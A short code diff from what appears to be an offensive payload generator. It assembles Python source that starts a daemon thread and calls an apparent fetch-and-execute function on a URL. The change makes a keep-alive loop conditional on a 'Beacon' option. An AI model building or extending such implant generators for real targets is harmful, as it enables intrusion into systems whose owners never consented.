@@ -93,8 +93,9 @@ class Payload:
 		main += "\n\t\t%s.setDaemon(True)" % thread_var
 		main += "\n\t\t%s.start()" % thread_var
 		main += "\n\t%s(%s)" % (getexec_func, url_var)
-		main += "\n\twhile True:"
-		main += "\n\t\ttime.sleep(0.1)"
+		if self.required_options["Beacon"][0].lower() == 'y':
+			main += "\n\twhile True:"
+			main += "\n\t\ttime.sleep(0.1)"
 		main += "\nif __name__ == '__main__':"
 		main += "\n\t%s()" % main_func
 
